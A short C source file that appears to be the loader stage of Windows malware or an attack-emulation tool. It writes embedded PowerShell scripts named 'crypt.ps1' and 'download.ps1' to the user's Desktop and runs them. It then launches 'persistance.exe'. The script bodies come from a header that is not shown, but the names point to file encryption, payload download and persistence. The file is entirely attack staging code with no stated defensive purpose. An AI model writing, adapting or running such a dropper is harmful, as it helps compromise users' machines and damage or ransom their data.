#include <stdio.h>
#include <stdlib.h>
#include "helpers.h"
#include "script_constants/script_constants.h"


int main() {
    const size_t bufferLen = 300;
    char *userProfilePath = getenv("UserProfile");
    int return_val;

    char crypt_script_path[bufferLen];
    snprintf(crypt_script_path, bufferLen, "%s\\Desktop\\crypt.ps1", userProfilePath);
    write_string(crypt_script_path, crypt_script);
    return_val = run_powershell_script(crypt_script_path);
    if (return_val != 0) {
        return return_val;
    }

    char download_script_path[bufferLen];
    snprintf(download_script_path, bufferLen, "%s\\Desktop\\download.ps1", userProfilePath);
    write_string(download_script_path, download_script);
    return_val = run_powershell_script(download_script_path);
    if (return_val != 0) {
        return return_val;
    }
    
    char samplePath[bufferLen];
    snprintf(samplePath, bufferLen, "%s\\Desktop\\persistance.exe", userProfilePath);
    return run_command(samplePath);
}